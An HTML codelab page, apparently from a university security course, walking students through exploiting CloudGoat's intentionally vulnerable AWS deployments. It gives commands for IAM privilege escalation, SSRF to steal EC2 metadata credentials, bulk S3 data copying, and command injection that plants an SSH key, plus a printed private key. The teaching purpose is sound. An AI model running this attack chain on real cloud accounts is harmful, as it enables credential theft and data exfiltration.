@@ -1,0 +1,343 @@
+
+<!doctype html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,user-scalable=yes">
+<meta name="theme-color" content="#4F7DC9">
+<meta charset="UTF-8">
+<title>8.4: CloudGoat</title>
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
+<link rel="stylesheet" href="//fonts.googleapis.com/icon?family=Material+Icons">
+<link rel="stylesheet" href="https://storage.googleapis.com/claat-public/codelab-elements.css">
+<style>
+.success{color:#1e8e3e}.error{color:red} </style>
+</head>
+<body>
+<google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
+<google-codelab codelab-gaid="" id="W8.4_aws_cloudgoat" title="8.4: CloudGoat" environment="web" feedback-link="https://docs.google.com/document/d/1-4Lyk8f_hWbEYBqLYazIYeqVpQ-uUE698rVjJVGCc3s">
+<google-codelab-step label="Introduction" duration="2">
+<p>The complexity of cloud-based applications can lead to a vast number of security issues. To show how these issues can occur, Rhino Security Lab&#39;s CloudGoat implements an intentionally vulnerable set of cloud deployments on AWS that users can exploit to gain unauthorized access. </p>
+<h2 is-upgraded><strong>What you will</strong> do</h2>
+<p>In this codelab, we will walk-through how to exploit each deployment. </p>
+<h2 class="checklist" is-upgraded><strong>What you&#39;ll learn</strong></h2>
+<ul class="checklist">
+<li>How to leverage vulnerabilities in cloud applications to gain unauthorized access to resources</li>
+</ul>
+<h2 is-upgraded><strong>What you&#39;ll need</strong></h2>
+<ul>
+<li>An account on <a href="https://www.awseducate.com/" target="_blank">AWS</a></li>
+<li>A machine with the <a href="https://aws.amazon.com/cli/" target="_blank">AWS CLI</a> installed. </li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="iam_privesc_by_rollback" duration="5">
+<h2 is-upgraded><strong>Starting credentials</strong></h2>
+<p>Note that if you are using Cloud9 for this exercise, you must turn off AWS managed temporary credentials. The vulnerable application credentials are located <a href="https://docs.google.com/document/d/1innY4rEcU0qZjWNrSdAFEjKEE-0yvsBP0lD5Inf_cGc" target="_blank">here</a>. To add these credentials as a profile within the AWS CLI, perform the following command and copy/paste the credentials into the profile. For the region name, specify <code>us-east-1</code> (where the resources for CloudGoat have been deployed). Leave the output format set to the default.</p>
+<pre><code>aws configure --profile raynor</code></pre>
+<h2 is-upgraded><strong>Overview</strong></h2>
+<p>Starting with Raynor&#39;s limited credentials, you will use it to view prior versions of the security policy associated with Raynor.</p>
+<p class="image-container"><img style="width:624px" src="img/51015f87d1f7eaae.png"></p>
+<p>While the permissions you currently have would allow you to revert to a prior version of the policy and restore a full set of admin rights, you will simply find the policy version that corresponds to a full set of rights.</p>
+<p class="image-container"><img style="width:624px" src="img/1956614247c0db7d.png"></p>
+</google-codelab-step>
+<google-codelab-step label="iam_privesc_by_rollback steps" duration="5">
+<h2 is-upgraded><strong>Step 1:</strong></h2>
+<p>Fill in the raynor username in the command below and run it. </p>
+<pre><code>aws iam list-attached-user-policies --profile raynor --user-name &lt;raynor_username&gt;</code></pre>
+<ul>
+<li><strong>Show the policies attached to the credentials given</strong></li>
+</ul>
+<h2 is-upgraded><strong>Step 2:</strong></h2>
+<p>List the versions of the policy that is associated with <code>raynor</code></p>
+<pre><code>aws iam list-policy-versions --profile raynor --policy-arn &lt;PolicyARN&gt;</code></pre>
+<ul>
+<li><strong>Which version of the policy is set as the default?</strong></li>
+</ul>
+<h2 is-upgraded><strong>Step 3:</strong></h2>
+<p>Step through each version of the policy using the command below. </p>
+<pre><code>aws iam get-policy-version --profile raynor
+--policy-arn &lt;PolicyARN&gt; --version-id &lt;versionID&gt;</code></pre>
+<ul>
+<li><strong>Show the output of the version in which all actions have been allowed (e.g full admin privileges) for a particular IP address</strong></li>
+</ul>
+<p>One can set the policy version to the version that allows full privileges to then gain access to all of the AWS project&#39;s resources via the <code>set-default-policy-version</code> command. However, as this is a shared instance of CloudGoat, leave the policy version alone for others.</p>
+</google-codelab-step>
+<google-codelab-step label="cloud_breach_s3" duration="5">
+<p>Misconfigured proxies can allow an external attacker to proxy requests to sensitive internal servers that are not directly reachable otherwise. An example of this is internal Metadata servers that keep sensitive authorization information for the account running the infrastructure. This is exactly what happened in the <a href="https://ejj.io/blog/capital-one" target="_blank">Capital One breach</a> which this scenario is derived from.</p>
+<h2 is-upgraded><strong>Starting information</strong></h2>
+<p>The vulnerable proxy location is given <a href="https://docs.google.com/document/d/1innY4rEcU0qZjWNrSdAFEjKEE-0yvsBP0lD5Inf_cGc" target="_blank">here</a>.</p>
+<h2 is-upgraded><strong>Overview</strong></h2>
+<p class="image-container"><img style="width:624px" src="img/6310191b49b8d414.png"></p>
+<p>We start with the proxy and initiate a server-side request forgery that allows us to use the proxy to pivot over to the Metadata service for the EC2 instance. Given the credentials we find on the Metadata service, we then assume the role associated with the EC2 instance hosting the proxy.</p>
+<p class="image-container"><img style="width:624px" src="img/607ad39170196d92.png"></p>
+<p>From this role, we can see that it has access to a multitude of S3 buckets that would not otherwise be accessible to us. Using the AWS CLI, we can then use the role obtained to exfiltrate sensitive data.</p>
+</google-codelab-step>
+<google-codelab-step label="cloud_breach_s3 steps (1-3)" duration="5">
+<h2 is-upgraded><strong>Step 1:</strong></h2>
+<p>Start by visiting the site from <code>linux.cs.pdx.edu</code> using <code>curl</code> to hit the web server. (Access to the site is restricted to PSU machines).</p>
+<ul>
+<li><strong>Show the error page returned.</strong></li>
+</ul>
+<pre><code>curl http://&lt;ec2_instance_IP&gt;</code></pre>
+<h2 is-upgraded><strong>Step 2:</strong></h2>
+<p>For the purpose of this exercise, the server has been set up to proxy request, but restricts itself only to requests to the metadata service that houses the instances AWS credentials. In the HTTP request headers, we can inject a &#34;Host:&#34; header to specify that we&#39;re interested in requesting the Metadata service. Repeat the curl command and specify the well-known IP address of the Metadata service.</p>
+<ul>
+<li><strong>Show the results.</strong></li>
+</ul>
+<pre><code>curl http://&lt;ec2_instance_IP&gt; -H &#39;Host: 169.254.169.254&#39;</code></pre>
+<p>We can navigate the Metadata service using the URL being proxied. In the previous output, a directory called latest is shown.</p>
+<ul>
+<li><strong>Show its contents via the following command: </strong></li>
+</ul>
+<pre><code>curl http://&lt;ec2_instance_IP&gt;/latest -H &#39;Host: 169.254.169.254&#39;</code></pre>
+<h2 is-upgraded><strong>Step 3:</strong></h2>
+<p>By navigating the Metadata service, one can access the roles associated with the EC2 instance running the proxy server.</p>
+<ul>
+<li><strong>To do so, show the name of the AWS role the following command exposes:</strong></li>
+</ul>
+<pre><code>curl http://&lt;ec2_instance_IP&gt;/latest/meta-data/iam/security-credentials/ -H &#39;Host: 169.254.169.254&#39;</code></pre>
+<ul>
+<li><strong>Then, show the credentials associated with the role. </strong></li>
+</ul>
+<pre><code>curl http://&lt;ec2_instance_IP&gt;/latest/meta-data/iam/security-credentials/&lt;name_of_role&gt; -H &#39;Host: 169.254.169.254&#39;</code></pre>
+<p>Note that the <code>AccessKeyId</code>, the <code>SecretAccessKey</code>, and a session <code>Token</code> are all available for you to now take on the roles associated with the EC2 instance. A session token is an ephemeral credential that can be used to authenticate access to resources. </p>
+</google-codelab-step>
+<google-codelab-step label="cloud_breach_s3 steps (4-6)" duration="5">
+<h2 is-upgraded>Step 4:</h2>
+<p>While the <code>aws configure</code> command allows us to create a profile with a particular <code>AccessKeyId</code> and <code>SecretAccessKey</code>, it does not allow us to specify the <code>Token.</code> An alternative way for adding profiles is to edit <code>~/.aws/credentials</code> . The file contains the profile information from previous <code>aws configure</code> commands. Configure a profile called <code>erratic</code> from the AWS CLI containing the AWS access key ID and secret access key information as before. Note the origin of the profile name by reading this <a href="https://krebsonsecurity.com/2019/07/capital-one-data-theft-impacts-106m-people/" target="_blank">article</a> on the Capital One breach in 2019. </p>
+<pre><code>aws configure --profile erratic</code></pre>
+<p>Then, edit the credentials file to include the temporary AWS session token. </p>
+<pre><code>[erratic]
+aws_access_key_id = ASIA...Z4N
+aws_secret_access_key = PkvP...PM9
+aws_session_token = IQoJ...w==</code></pre>
+<p>The token itself is ephemeral and will only be valid for several minutes. If you get an <code>InvalidToken</code> error on any of the subsequent commands, you will need to go back to Step 3 and obtain a fresh one.</p>
+<h2 is-upgraded><strong>Step 5:</strong></h2>
+<p>Use the credentials to list all of the buckets in S3 for this project. </p>
+<pre><code>aws s3 ls --profile erratic</code></pre>
+<p>Identify the bucket that might contain &#34;cardholder data&#34; as was done by <code>erratic</code> in the Capital One breach. </p>
+<h2 is-upgraded><strong>Step 6:</strong></h2>
+<p>Copy over all of the files found in the open bucket. Note that one can use either a recursive copy:</p>
+<pre><code>aws s3 cp --recursive s3://&lt;bucket-name&gt; ./cardholder-data --profile erratic</code></pre>
+<p>Or a sync command:</p>
+<pre><code>aws s3 sync s3://&lt;bucket-name&gt; ./cardholder-data --profile erratic</code></pre>
+<ul>
+<li><strong>Show the first two lines of each of the CSV files you have copied over from the bucket via the command below.</strong></li>
+</ul>
+<pre><code>head -2 cardholder-data/*.csv</code></pre>
+</google-codelab-step>
+<google-codelab-step label="ec2_ssrf" duration="5">
+<h2 is-upgraded><strong>Starting credentials</strong></h2>
+<p>The vulnerable application credentials are located <a href="https://docs.google.com/document/d/1innY4rEcU0qZjWNrSdAFEjKEE-0yvsBP0lD5Inf_cGc" target="_blank">here</a> . To add these credentials as a profile within the AWS CLI, perform the following command and copy/paste the credentials into the profile. For the region name, specify <code>us-east-1</code> (where the resources for CloudGoat have been deployed)</p>
+<pre><code>aws configure --profile solus</code></pre>
+<h2 is-upgraded><strong>Overview</strong></h2>
+<p>Starting with Solus&#39;s limited credentials, you will use it to discover another access key.</p>
+<p class="image-container"><img style="width:624px" src="img/ca46f4c6186051df.png"></p>
+<p>The keys allow you to discover a running EC2 instance that contains an SSRF vulnerability. Using this vulnerability, you will access the Metadata service.</p>
+<p class="image-container"><img style="width:456.96px" src="img/a2b0debfd7a1c393.png"></p>
+<p>The Metadata service exposes the EC2 instance&#39;s keys which you can then use to obtain access to a storage bucket that contains IAM keys for an administrator. Using these credentials, you will invoke a restricted Lambda function. </p>
+<p class="image-container"><img style="width:624px" src="img/64357b923d33c90b.png"></p>
+</google-codelab-step>
+<google-codelab-step label="ec2_ssrf steps (1-2)" duration="5">
+<h2 is-upgraded><strong>Step 1:</strong></h2>
+<p>Use the <code>solus</code> profile to list the Lambda functions that are accessible.</p>
+<pre><code>aws lambda list-functions --profile solus</code></pre>
+<p>Find the cloud function associated with the CloudGoat level (<code>cg-lambda-...</code>) and try invoking it as <code>solus</code></p>
+<pre><code>aws lambda invoke ./out.txt --profile solus --function-name cg-lambda-&lt;cloudgoat_id&gt; </code></pre>
+<p>While the profile is able to list the Lambdas, it does not have the ability to execute them. However, listing the functions also lists the environment variables that the Lambda has been given. Unfortunately, it is often the case that AWS credentials are sent via environment variables since it is best practice not to include them within source code. From the listing, identify an EC2 access key that the Lambda function uses to authenticate itself to project resources. Add a profile called <code>wrex</code> that contains these credentials specifying <code>us-east-1</code> for the region.</p>
+<pre><code>aws configure --profile wrex</code></pre>
+<h2 is-upgraded><strong>Step 2:</strong></h2>
+<p>Use the Lambda&#39;s credentials to list all of the running EC2 instances it has access to</p>
+<pre><code>aws ec2 describe-instances --filters Name=instance-state-name,Values=running --profile wrex</code></pre>
+<p>Within the instances, is a server associated with <code>ec2_ssrf</code> that is running a web site. Get its IP address, then login to a PSU machine and use <code>curl</code> to access the page. (The level has restricted access to PSU IP addresses only for security purposes).</p>
+<pre><code># On linux.cs.pdx.edu or linuxlab.cs.pdx.edu
+curl http://&lt;IP_address_of_server&gt;</code></pre>
+<ul>
+<li><strong>Take a screenshot of the page that is returned</strong>.</li>
+</ul>
+<p>The site is expecting a URL to be given and throws an error when it is not. Access it again, but with a <code>'url'</code> parameter. Note that we use the double-quotes around the URL so the shell does not interpret the <code>?</code> or <code>=</code> characters in the URL.</p>
+<pre><code># On linux.cs.pdx.edu or linuxlab.cs.pdx.edu
+curl &#34;http://&lt;IP_address_of_server&gt;/?url=http://&lt;FMI&gt;&#34;</code></pre>
+<ul>
+<li><strong>Take a screenshot of the page that is returned.</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="ec2_ssrf steps (3-5)" duration="5">
+<h2 is-upgraded><strong>Step 3:</strong></h2>
+<p>The proxy implemented may be vulnerable to an SSRF attack. The Metadata service is a common target for such attacks. Send in the EC2 Metadata service URL as the <code>url</code> parameter in order to obtain the credentials the EC2 instance uses to access resources in the project.</p>
+<pre><code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code></pre>
+<p>The proxy fetches the URL and returns a directory that identifies the role associated with the EC2 instance. Access the proxy again.</p>
+<ul>
+<li><strong>Take a screenshot showing the information associated with the role.</strong></li>
+</ul>
+<pre><code>http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-&lt;cloudgoat_id&gt;</code></pre>
+<p>The access reveals the keys associated with the role that the EC2 instance has been given. It also contains a session token. </p>
+<p>Configure a profile called <code>ec2role</code> from the AWS CLI containing the AWS access key ID and secret access key information. Specify the region as <code>us-east-1</code>.</p>
+<pre><code>aws configure --profile ec2role</code></pre>
+<p>Then, to specify the full credentials for the role including its session token, edit <code>~/.aws/credentials</code> . Within this file, find the <code>ec2role</code> and add the session token information.</p>
+<pre><code>[ec2role]
+aws_access_key_id = ASIA...Z4N
+aws_secret_access_key = PkvP...PM9
+aws_session_token = IQoJ...w==</code></pre>
+<h2 is-upgraded><strong>Step 4:</strong></h2>
+<p>Use the <code>ec2role</code> to list the buckets it has access to.</p>
+<pre><code>aws s3 ls --profile ec2role</code></pre>
+<p>Within the bucket listings is a &#39;secret&#39; bucket containing the name of the role discovered via the prior SSRF. Use the <code>ec2role</code> to list the buckets it has access to.</p>
+<pre><code>aws s3 ls --profile ec2role s3://cg-secret-s3-bucket-&lt;cloudgoat_id&gt;</code></pre>
+<p>Retrieve the text file that resides in the bucket and view its contents </p>
+<pre><code>aws s3 cp --profile ec2role s3://cg-secret-s3-bucket-&lt;cloudgoat_id&gt;/&lt;textfile&gt; .</code></pre>
+<h2 is-upgraded><strong>Step 5:</strong></h2>
+<p>The file stores credentials. As bad as it is to have credentials exposed in environment variables and SSRF accesses, it&#39;s just as bad to have the credentials in storage buckets or source code. Use the credentials in this file to configure another role called <code>shepherd</code> specifying <code>us-east-1</code> for the region.</p>
+<pre><code>aws configure --profile shepherd</code></pre>
+<p>Go back and attempt to invoke the initial Lambda function done in the first step as <code>solus</code>, but use the <code>shepherd</code> profile.</p>
+<pre><code>aws lambda invoke ./out.txt --region us-east-1 --profile shepherd --function-name cg-lambda-&lt;cloudgoat_id&gt; </code></pre>
+<ul>
+<li><strong>Take a screenshot of the output in </strong><strong><code>out.txt</code></strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="rce_web_app" duration="5">
+<h2 is-upgraded><strong>Starting credentials</strong></h2>
+<p>The vulnerable application credentials are located <a href="https://docs.google.com/document/d/1innY4rEcU0qZjWNrSdAFEjKEE-0yvsBP0lD5Inf_cGc" target="_blank">here</a>.</p>
+<p>There are two ways to solve this level. We will use the one that leverages Lara&#39;s credentials. Add these credentials as a profile within the AWS CLI. For the region name, specify <code>us-east-1</code> (where the resources for CloudGoat have been deployed)</p>
+<pre><code>aws configure --profile Lara</code></pre>
+<h2 is-upgraded><strong>Overview</strong></h2>
+<p>Starting with Lara&#39;s limited credentials, list the S3 buckets it can access and find that one of them has log files from an Elastic Load Balancer instance the account is running.</p>
+<p class="image-container"><img style="width:624px" src="img/286dbf729614507a.png"></p>
+<p>The log files reveal a secret admin URL that is part of the web service being hosted. Unfortunately, there is a remote-code execution vulnerability within it. Exploit it to gain command access on an EC2 instance. </p>
+<p class="image-container"><img style="width:624px" src="img/d9b75b4e25075326.png"></p>
+<p>From here, we&#39;ll take a peak at the EC2 Metadata service to reveal all of the information the EC2 instance needs to access the backend database for the service. One could use this information to access the database and finish the level, but we&#39;ll solve it a more convoluted way for fun! Returning back to the instance, we will leverage the shell to list the S3 buckets the instance has access to and find the file in the bucket that contains the same backend database credentials found in the Metadata. Use the AWS CLI to list the RDS instances available to discover the location of the backend database.</p>
+<p class="image-container"><img style="width:624px" src="img/3e15fc8a385c82c1.png"></p>
+<p>We will then use the database credentials and the location information of the RDS backend to then access the database and reveal the secret text. </p>
+<p class="image-container"><img style="width:419.5px" src="img/c095b17cb0b6e6f4.png"></p>
+</google-codelab-step>
+<google-codelab-step label="rce_web_app steps (1-3)" duration="5">
+<h2 is-upgraded><strong>Step 1:</strong></h2>
+<p>Starting with Lara&#39;s limited credentials, list all of the S3 buckets it can find and see which ones it can list the contents for. </p>
+<pre><code>aws s3 ls --profile Lara
+aws s3 ls --profile Lara s3://cg-XXX-s3-bucket-cgid...
+aws s3 ls --profile Lara s3://cg-YYY-s3-bucket-cgid... 
+aws s3 ls --profile Lara s3://cg-ZZZ-s3-bucket-cgid... </code></pre>
+<p>For the bucket that this set of credentials can access, recursively list all of its contents. </p>
+<pre><code>aws s3 ls  --recursive --profile Lara s3://&lt;cg-bucket&gt;</code></pre>
+<h2 is-upgraded><strong>Step 2:</strong></h2>
+<p>The bucket has log files from an Elastic Load Balancer instance the account is running. Sync the bucket contents to a local directory, then examine a log file from a prior running version of a service from 06/19/2019. Find a secret route to an HTML file that the service supported.</p>
+<pre><code>aws s3 sync  --profile Lara s3://&lt;cg-logs-bucket&gt; .
+less &lt;path_to_log_file&gt;/&lt;logfile&gt;
+
+grep html &lt;path_to_log_file&gt;/&lt;logfile&gt;</code></pre>
+<h2 is-upgraded><strong>Step 3:</strong></h2>
+<p>Find the location of the load balancer for the currently deployed version of the service.</p>
+<pre><code>aws elbv2 describe-load-balancers --profile Lara</code></pre>
+<p>Visit the URL in a web browser, the URL will return something similar to below:</p>
+<h2 is-upgraded><img style="width:287px" src="img/b05c30fdac7bd5e.png"></h2>
+<p>Append the secret route to the HTML file in the previous step to reveal the hidden web interface for running commands on the web site directly that is still supported by the service. </p>
+<p class="image-container"><img style="width:339px" src="img/1cf340cce496d693.png"></p>
+</google-codelab-step>
+<google-codelab-step label="rce_web_app steps (4-6)" duration="5">
+<h2 is-upgraded>Step 4:</h2>
+<p>Visit <a href="https://ifconfig.me" target="_blank">https://ifconfig.me</a> to see the function it provides. Then within the &#34;Run Signup Command&#34; UI, execute the following to obtain the IP address of the instance running the web site.</p>
+<pre><code>curl https://ifconfig.me</code></pre>
+<ul>
+<li><strong>What is the IP address of the web site that is returned?</strong></li>
+</ul>
+<h2 is-upgraded><strong>Step 5:</strong></h2>
+<p>The UI allows us to run any command. One command that we can run is to add an <code>ssh</code> key that we control to the <code>authorized_keys</code> of the machine running the UI. First, run the command below via the &#34;Run Signup Command&#34; UI to dump out the contents of the file:</p>
+<pre><code>cat /home/ubuntu/.ssh/authorized_keys</code></pre>
+<ul>
+<li><strong>Show the output that is returned.</strong></li>
+</ul>
+<h2 is-upgraded><strong>Step 6:</strong></h2>
+<p>We wish to create an <code>ssh</code> key and add it to the <code>authorized_keys</code> file of the web site so that we can subsequently log into it. One note about the level is that it has been configured to only allow <code>ssh</code> from PSU machines.</p>
+<p>So, to begin with, log into a <code>linuxlab</code> machine and run the following <code>ssh-keygen</code> command to generate a public/private <code>ssh</code> keypair keypair (<code>foo.pub</code>, <code>foo</code>). </p>
+<pre><code>ssh-keygen -t ed25519 -f foo</code></pre>
+<p>Then dump out the public key (<code>foo.pub</code>). </p>
+<pre><code>cat foo.pub</code></pre>
+<p>If the public key has &#34;<code>=</code>&#34; anywhere within it, repeat the <code>ssh-keygen</code> command until you generate a public key without the character in it. This is necessary since the command injection on the application is done in a way that evaluates the &#34;<code>=</code>&#34; character.</p>
+<p>Alternatively, if you wish to skip this step, you may instead use the keypair provided below for the exercise. Copy the contents below into their respective files <code>foo.pub</code> and <code>foo</code>.</p>
+<h3 is-upgraded>foo.pub</h3>
+<pre>ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKdwX5jjY0TugPOVGBbU+I8JoY4Ycj7p/szytyHaBlXy wuchang@mashimaro</pre>
+<h3 is-upgraded>foo</h3>
+<pre>-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACCncF+Y42NE7oDzlRgW1PiPCaGOGHI+6f7M8rch2gZV8gAAAJihKTfIoSk3
+yAAAAAtzc2gtZWQyNTUxOQAAACCncF+Y42NE7oDzlRgW1PiPCaGOGHI+6f7M8rch2gZV8g
+AAAEAAyLF7YDOLMAj3Cby4Yb/QXbWI6Q2HinQXK5NmlX6aWKdwX5jjY0TugPOVGBbU+I8J
+oY4Ycj7p/szytyHaBlXyAAAAEXd1Y2hhbmdAbWFzaGltYXJvAQIDBA==
+-----END OPENSSH PRIVATE KEY-----</pre>
+</google-codelab-step>
+<google-codelab-step label="rce_web_app steps (7-8)" duration="5">
+<h2 is-upgraded><strong>Step 7:</strong></h2>
+<p>We now have an <code>ssh</code> keypair on a PSU Linux machine. To utilize the private key, we&#39;ll first need to change its permissions to allow read-only access to the user.</p>
+<pre><code>chmod 400 foo</code></pre>
+<p>We will now add the public key (<code>foo.pub</code>) to the web site&#39;s <code>authorized_keys</code>. Go back to the &#34;Run Signup Command&#34; UI and run an echo command that contains the contents of foo.pub, appending the output to the site&#39;s <code>authorized_keys</code> file.</p>
+<pre><code>echo &#34;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILc/THRSn/Ya4AMl9c8WVAG99PapIQuApVn8/PfExHMB wuchang@mashimaro&#34; &gt;&gt; /home/ubuntu/.ssh/authorized_keys</code></pre>
+<p>Ensure the output shows no errors. Then, re-run Step 5 to see the key has been added properly.</p>
+<h2 is-upgraded>Step 8:</h2>
+<p>Use the private <code>ssh</code> key to now log into the web site.</p>
+<pre><code>ssh -i foo ubuntu@&lt;IP_address_of_web_site&gt;</code></pre>
+<p>You should now be logged into the instance running the web site.</p>
+<ul>
+<li><strong>Show a directory listing of the account you&#39;ve logged into.</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="rce_web_app steps (9-11)" duration="5">
+<h2 is-upgraded><strong>Step 9:</strong></h2>
+<p>When an EC2 instance is started, one can specify a script to execute in &#39;user-data&#39; that installs software and sets up the VM. The Metadata service holds this script. Since we now have a foothold on a victim&#39;s instance, we can query the Metadata service for the script.</p>
+<ul>
+<li><strong>Show the output of this script and show the command that is run that reveals the database credentials. </strong></li>
+</ul>
+<pre><code>curl http://169.254.169.254/latest/user-data</code></pre>
+<p>We could use these directly, however, we&#39;ll be taking an alternate path.</p>
+<h2 is-upgraded><strong>Step 10:</strong></h2>
+<p>See if the AWS CLI has been installed on the machine.</p>
+<pre><code>which aws</code></pre>
+<p>If not, then you are the first visitor to this level. Go ahead and install the AWS CLI</p>
+<pre><code>sudo apt install awscli</code></pre>
+<h2 is-upgraded><strong>Step 11:</strong></h2>
+<p>Then use the AWS CLI to list the S3 buckets from Step 1. </p>
+<pre><code>aws s3 ls
+aws s3 ls s3://cg-XXX-s3-bucket-cgid...
+aws s3 ls s3://cg-YYY-s3-bucket-cgid...
+aws s3 ls s3://cg-ZZZ-s3-bucket-cgid...</code></pre>
+<ul>
+<li><strong>Which buckets can you access now?</strong></li>
+</ul>
+<p>One bucket you can access is a &#39;<code>secret-s3-bucket</code>&#39; that contains a file called <code>db.txt</code> in it. See the credentials that are contained in it.</p>
+<pre><code>aws s3 cp s3://&lt;cg-secret-s3-bucket&gt;/db.txt -</code></pre>
+<ul>
+<li><strong>Show the contents of the file. </strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="rce_web_app steps (12-14)" duration="5">
+<h2 is-upgraded><strong>Step 12:</strong></h2>
+<p>Use the AWS CLI on the instance to find all of the AWS RDS instances the web frontend has access to. </p>
+<pre><code>aws rds describe-db-instances --region us-east-1</code></pre>
+<h2 is-upgraded><strong>Step 13:</strong></h2>
+<p>Run the PostgreSQL client to connect to the RDS instance using the credentials found in <code>db.txt</code></p>
+<pre><code>psql postgresql://&lt;db_user&gt;:&lt;db_password&gt;@&lt;rds-instance-address&gt;:5432/&lt;db_name&gt;</code></pre>
+<h2 is-upgraded><strong>Step 14:</strong></h2>
+<p>Within the PostgreSQL client,</p>
+<ul>
+<li><strong>Show the table that is stored and its contents. </strong></li>
+</ul>
+<pre><code>\dt
+
+SELECT * from &lt;table-name&gt;;</code></pre>
+</google-codelab-step>
+<google-codelab-step label="Congratulations" duration="1">
+<p>You&#39;ve completed the AWS CloudGoat lab.</p>
+<h2 class="checklist" is-upgraded><strong>What we&#39;ve covered</strong></h2>
+<p>The exercises have shown you cloud-based examples of:</p>
+<ul>
+<li>Sensitive information disclosure</li>
+<li>Lateral movement</li>
+<li>Privilege escalation</li>
+</ul>
+</google-codelab-step>
+</google-codelab>
+<script src="https://storage.googleapis.com/claat-public/native-shim.js"></script>
+<script src="https://storage.googleapis.com/claat-public/custom-elements.min.js"></script>
+<script src="https://storage.googleapis.com/claat-public/prettify.js"></script>
+<script src="https://storage.googleapis.com/claat-public/codelab-elements.js"></script>
+<script src="//support.google.com/inapp/api.js"></script>
+</body>
+</html>
